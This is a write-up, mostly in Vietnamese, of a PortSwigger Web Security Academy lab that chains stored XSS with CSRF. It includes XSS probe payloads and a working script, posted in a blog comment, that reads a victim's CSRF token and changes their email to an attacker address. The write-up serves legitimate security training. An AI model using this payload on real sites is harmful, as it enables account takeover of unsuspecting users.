# CSRF

# Demo: Exploiting XSS to perform CSRF @ PortSwigger Academy

![logo](https://github.com/elliSzAt/CSRF/assets/125866921/aebb59de-c415-44ef-849c-da53c5a2a939)

This write-up for the lab *Exploiting XSS to perform CSRF* is part of my walk-through series for [PortSwigger's Web Security Academy](https://portswigger.net/web-security).

Learning path: Client-side → Cross-site scripting (XSS)

Lab-Link: <https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf>  
Difficulty: PRACTITIONER  

## Lab description

![lab_description](https://github.com/elliSzAt/CSRF/assets/125866921/7d32f4a4-d28a-4c4e-97a2-09f396b89a69)

## Steps

### Analysis

Như thường lệ, bước đầu tiên là phân tích chức năng của bài lab, trong trường hợp này là trang blog.

### Find stored XSS

Có một nơi trong các trang công cộng mà bất kỳ khách truy cập nào cũng có thể thêm nội dung: phần bình luận bên dưới mỗi bài viết (mô tả trong bài lab đã nêu rõ vị trí của nó, nhưng dù sao thì đó cũng là nơi duy nhất để lưu trữ nội dung).

Do đó tôi đã thử để xem có thể chèn các thẻ ``html`` vào được không.

![inserted_html](https://github.com/elliSzAt/CSRF/assets/125866921/296926fa-c29c-4a35-8e3e-b270dc0887a0)

![inserted_html_result](https://github.com/elliSzAt/CSRF/assets/125866921/c0762409-b48c-4e27-9cbb-c4e81c1486ed)

Ta có thể thấy trong phần ``Name`` có 1 vài thử đã bị mã hóa, nhưng nội dung mà tôi bình luận thì sẽ được đưa thẳng vào.

Bước tiếp theo tôi tìm hiểu là:

- Có thể chèn 1 khối tài liệu 1 cách đầy đủ hay không.
- Có thể thêm 1 script chứa tag ``img`` hay không.
- Có bất kì thứ gì bị chặn hay bị mã hóa chống tấn công XSS không.

Tôi tiến hành detect với payload sau.
```
<script>alert(document.domain)</script>
<img src=x onerror='alert(document.domain)' />
xX';!--"<XSS>=\&{()}<br />Xx
```

![xss_answers](https://github.com/elliSzAt/CSRF/assets/125866921/1acbc6e5-fddd-4943-ac33-72262c21c4ad)

Khi xem phần bình luận, tôi thấy được những kí tự nào bị block và mã hóa, tiếp theo tôi cần tìm chỗ để tiêm payload của mình vào.

---

### Find out how to change email

Bây giờ là lúc sử dụng thông tin đăng nhập được cung cấp và đăng nhập với tư cách `wiener`. Mục tiêu của phòng thí nghiệm là thay đổi email của nạn nhân, vì vậy tôi xem cách hoạt động của nó:

![email_change](https://github.com/elliSzAt/CSRF/assets/125866921/ba5c51c4-c365-47bc-899f-2fe1d5d4e88b)

Yêu cầu được bảo vệ bằng mã thông báo CSRF được lưu trữ trong trường nhập ẩn của biểu mẫu thay đổi email.

Nói chung, mã thông báo như vậy là cách thích hợp để bảo vệ khỏi các cuộc tấn công CSRF và trình duyệt sẽ ngăn tôi đọc nội dung qua JavaScript từ các nguồn khác.

Tuy nhiên, trong trường hợp này, tôi có một lỗ hổng XSS mà hạn chế này không áp dụng vì nó đang chạy ở cùng một nguồn gốc.

---

### Chain the vulnerabilities

Để mọi thứ hoạt động, tôi cần xâu chuỗi các lỗ hổng này lại với nhau:

- Một cuộc tấn công CSRF gửi yêu cầu thay đổi email.
- The stored XSS lấy mã thông báo CSRF và thực hiện cuộc tấn công CSRF đó

Payload của tôi cần trích xuất mã thông báo CSRF từ trang `/my-account`. Cách tốt nhất là sử dụng biểu thức chính quy để phân tích cú pháp HTML và trả về mã thông báo.

Search gg 1 tí thì có tài liệu về  [match](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/match) và cách trả về giá trị của nó:

![match_docu](https://github.com/elliSzAt/CSRF/assets/125866921/c3e7e80b-698f-4282-b59b-034e2ec03657)

Để tìm biểu thức thích hợp, tôi chuyển sang [regex101](https://regex101.com/), sử dụng nguồn HTML đầy đủ của trang tài khoản làm chuỗi thử nghiệm.

![regex_crafter](https://github.com/elliSzAt/CSRF/assets/125866921/9bae237c-146c-4dd1-9970-548a35b5f6ca)

Với công cụ này, tôi thấy regex là `csrf" value="(\w+)"`. Không sử dụng `g` flag đảm bảo rằng mã thông báo CSRF được bao gồm trong kết quả của trận đấu dưới dạng mục thứ hai trong mảng trả về của `match`

---

### The malicious comment

Payload của tôi sẽ trông như thế này:

```html
<script>
var r = new XMLHttpRequest();
r.onload=function() {
    csrf = this.responseText.match(/csrf" value="(\w+)"/)[1];
    var attack = new XMLHttpRequest();
    attack.open("POST", "https://0a74007e040c37b4c0f5013c009600e3.web-security-academy.net/my-account/change-email", true);
    attack.send("email=mail@evil.me&csrf=" + csrf);
}
r.open("GET", "https://0a74007e040c37b4c0f5013c009600e3.web-security-academy.net/my-account", true);
r.withCredential = true;
r.send();
</script>
```

Đầu tiên, nó có được trang web tài khoản. Từ kết quả, nó trích xuất mã thông báo CSRF và đưa ra một yêu cầu khác đối với chức năng thay đổi email.

![malicious_comment](https://github.com/elliSzAt/CSRF/assets/125866921/f95453ec-b9f7-4d31-85b4-b6e3a44c5919)

Ngay sau khi gửi bình luận, lab sẽ cập nhật lên

Sau khi truy cập thủ công trang bình luận và truy cập trang tài khoản, tôi có thể xác minh rằng email thực sự đã bị thay đổi chỉ bằng cách xem bình luận:

![success](https://github.com/elliSzAt/CSRF/assets/125866921/83249619-f4c0-41b1-9d73-1f970c03655a)

---


